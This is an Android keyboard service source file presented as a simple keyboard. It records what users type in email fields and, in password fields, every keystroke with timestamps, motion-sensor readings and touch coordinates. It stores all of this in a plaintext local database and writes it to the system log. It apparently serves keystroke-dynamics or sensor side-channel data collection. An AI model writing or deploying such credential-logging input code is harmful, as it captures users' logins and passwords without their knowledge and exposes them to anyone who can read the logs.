package com.example.dasha.simplekeyboard;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;;
import android.text.InputType;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;

import java.util.Calendar;

import static android.text.InputType.TYPE_CLASS_TEXT;
import static android.text.InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS;
import static android.text.InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD;

public class SimpleIME extends InputMethodService
        implements KeyboardView.OnKeyboardActionListener {

    private KeyboardView kv;
    private Keyboard keyboard;

    SensorManager sensorManager;
    Sensor sensorGyro, sensorMagnet, sensorAccel;
    Sensor sensorLinAccel, sensorGravity;

    private boolean caps = false;

    final String TAG = "myLog";
    String login;
    String text_for_file;

    DBHelper dbHelper;

    long currentTime;

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        ContentValues cv;

        switch(primaryCode){
            case Keyboard.KEYCODE_DELETE :
                ic.deleteSurroundingText(1, 0);
                if (inputType == TYPE_CLASS_TEXT && variation == TYPE_TEXT_VARIATION_EMAIL_ADDRESS) {
                    int len = login.length();
                    if (len > 0)
                        login = login.substring(0, len-1);
                }

                cv = new ContentValues();
                cv.put("text", "login;" + login);
                db = dbHelper.getWritableDatabase();
                db.insert("mytable", null, cv);

                break;
            case Keyboard.KEYCODE_SHIFT:
                caps = !caps;
                keyboard.setShifted(caps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                break;
            default:
                char code = (char)primaryCode;
                if(Character.isLetter(code) && caps){
                    code = Character.toUpperCase(code);
                }
                ic.commitText(String.valueOf(code),1);
                if (inputType == TYPE_CLASS_TEXT && variation == TYPE_TEXT_VARIATION_EMAIL_ADDRESS) {
                    login += String.valueOf(code);

                    cv = new ContentValues();
                    cv.put("text", "login;" + login);
                    db.insert("mytable", null, cv);
                }
        }
    }

    @Override
    public void onPress(int primaryCode) {
        if (inputType == TYPE_CLASS_TEXT && variation == TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) {

            currentTime = Calendar.getInstance().getTimeInMillis();
            getDeviceOrientation();

            text_for_file = primaryCode + ";" + currentTime + ";"
                    + valuesOrient[0] + ";" + valuesOrient[1] + ";"
                    + valuesOrient[2] + ";" + valuesLinAccel[0] + ";"
                    + valuesLinAccel[1] + ";" + valuesLinAccel[2] + ";"
                    + valuesGravity[0] + ";" + valuesGravity[1] + ";"
                    + valuesGravity[2] + ";" + valuesGyro[0] + ";"
                    + valuesGyro[1] + ";" + valuesGyro[2] + ";"
                    + x + ";" + y;
        }
    }

    @Override
    public void onRelease(int primaryCode) {
        if (inputType == TYPE_CLASS_TEXT && variation == TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) {
            currentTime = Calendar.getInstance().getTimeInMillis();
            text_for_file = text_for_file + ";" + currentTime + "\n";

            if (primaryCode == 58) {
                SQLiteDatabase db = dbHelper.getWritableDatabase();
                //READ ALL
                Log.d(TAG, "--- Rows in mytable: ---");
                Cursor c = db.query("mytable", null, null,
                        null, null, null, null);

                if (c.moveToFirst()) {

                    int idColIndex = c.getColumnIndex("id");
                    int textColIndex = c.getColumnIndex("text");

                    do {
                        Log.d(TAG, "ID = " + c.getInt(idColIndex) +
                                        ", text = " + c.getString(textColIndex));
                    } while (c.moveToNext());
                } else
                    Log.d(TAG, "0 rows");
                c.close();
            }

            //INSERT ROW
            ContentValues cv = new ContentValues();
            cv.put("text", text_for_file);
            SQLiteDatabase db = dbHelper.getWritableDatabase();
            long rowID = db.insert("mytable", null, cv);
            Log.d(TAG, text_for_file);
        /*
            //CLEAR
            Log.d(TAG, "--- Clear mytable: ---");
            // удаляем все записи
            int clearCount = db.delete("mytable", null, null);
            Log.d(TAG, "deleted rows count = " + clearCount);
        */

        }
    }

    @Override
    public void onText(CharSequence text) {
    }

    @Override
    public void swipeDown() {
    }

    @Override
    public void swipeLeft() {
    }

    @Override
    public void swipeRight() {
    }

    @Override
    public void swipeUp() {
    }

    @Override
    public void onCreate () {
        super.onCreate();

        sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        sensorLinAccel = sensorManager.getDefaultSensor(Sensor.TYPE_LINEAR_ACCELERATION);
        sensorGravity = sensorManager.getDefaultSensor(Sensor.TYPE_GRAVITY);
        sensorGyro = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
        sensorMagnet = sensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
        sensorAccel = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);

        dbHelper = new DBHelper(this);
    }

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        kv.setOnTouchListener(touchListener);
        return kv;
    }

    int inputType;
    int variation;
    @Override
    public void onStartInputView(EditorInfo info, boolean restarting) {
        super.onStartInputView(info, restarting);
        Log.v(TAG, "On start input view");
        inputType = info.inputType & InputType.TYPE_MASK_CLASS;
        variation = info.inputType & InputType.TYPE_MASK_VARIATION;

        if (inputType == TYPE_CLASS_TEXT)
            switch(variation) {
                case TYPE_TEXT_VARIATION_EMAIL_ADDRESS:
                    login = "";
                case TYPE_TEXT_VARIATION_VISIBLE_PASSWORD:
                    sensorManager.registerListener(listener, sensorAccel, SensorManager.SENSOR_DELAY_FASTEST);
                    sensorManager.registerListener(listener, sensorMagnet, SensorManager.SENSOR_DELAY_FASTEST);
                    sensorManager.registerListener(listener, sensorGyro, SensorManager.SENSOR_DELAY_FASTEST);
                    sensorManager.registerListener(listener, sensorGravity, SensorManager.SENSOR_DELAY_FASTEST);
                    sensorManager.registerListener(listener, sensorLinAccel, SensorManager.SENSOR_DELAY_FASTEST);
                    break;
                default:
                    break;
        }
    }

    @Override
    public void onFinishInputView(boolean finishingInput) {
        super.onFinishInputView(finishingInput);
        Log.v(TAG, "On finish input view");
        ContentValues cv = new ContentValues();
        cv.put("text", "On finish input view");
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        db.insert("mytable", null, cv);
        if (inputType == TYPE_CLASS_TEXT && variation == TYPE_TEXT_VARIATION_VISIBLE_PASSWORD)
            sensorManager.unregisterListener(listener);
    }

    float[] r = new float[9];
    float[] valuesLinAccel = new float[3];
    float[] valuesGravity = new float[3];
    float[] valuesAccel = new float[3];
    float[] valuesMagnet = new float[3];
    float[] valuesOrient = new float[3];
    float[] valuesGyro = new float[3];

    void getDeviceOrientation() {
        SensorManager.getRotationMatrix(r, null, valuesAccel, valuesMagnet);
        SensorManager.getOrientation(r, valuesOrient);

        valuesOrient[0] = (float) Math.toDegrees(valuesOrient[0]);
        valuesOrient[1] = (float) Math.toDegrees(valuesOrient[1]);
        valuesOrient[2] = (float) Math.toDegrees(valuesOrient[2]);
    }

    SensorEventListener listener = new SensorEventListener() {

        @Override
        public void onAccuracyChanged(Sensor sensor, int accuracy) {
        }

        @Override
        public void onSensorChanged(SensorEvent event) {
            switch (event.sensor.getType()) {
                case Sensor.TYPE_LINEAR_ACCELERATION:
                    for (int i = 0; i < 3; i++) {
                        valuesLinAccel[i] = event.values[i];
                    }
                    break;
                case Sensor.TYPE_GRAVITY:
                    for (int i = 0; i < 3; i++) {
                        valuesGravity[i] = event.values[i];
                    }

                case Sensor.TYPE_ACCELEROMETER:
                    for (int i=0; i < 3; i++){
                        valuesAccel[i] = event.values[i];
                    }
                    break;
                case Sensor.TYPE_MAGNETIC_FIELD:
                    for (int i=0; i < 3; i++){
                        valuesMagnet[i] = event.values[i];
                    }
                case Sensor.TYPE_GYROSCOPE:
                    for (int i=0; i < 3; i++){
                        valuesGyro[i] = event.values[i];
                    }
                    break;
            }
        }
    };

    float x;
    float y;
    float pressure;
    float fingerArea;
    float toolMajor;
    float touchMajor;

    int mActivePointerId; //add pressure !!!!!!!!

    View.OnTouchListener touchListener = new View.OnTouchListener() {

        @Override
        public boolean onTouch(View v, MotionEvent event) {
            if (inputType == TYPE_CLASS_TEXT && variation == TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
                    && event.getAction() == MotionEvent.ACTION_DOWN) {

                x = event.getX();
                //Log.v(TAG, "X = " + x);
                y = event.getY();
                //Log.v(TAG, "Y = " + y);
                //pressure = event.getPressure();
                //Log.v(TAG, "Pressure = " + pressure);
                //fingerArea = event.getSize();
                //Log.v(TAG, "Finger area = " + fingerArea);
            }
            return false;
        }
    };

    class DBHelper extends SQLiteOpenHelper {

        public DBHelper(Context context) {
            super(context, "myDB", null, 1);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            db.execSQL("create table mytable ("
                    + "id integer primary key autoincrement,"
                    + "text" + ");");
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        }
    }
}

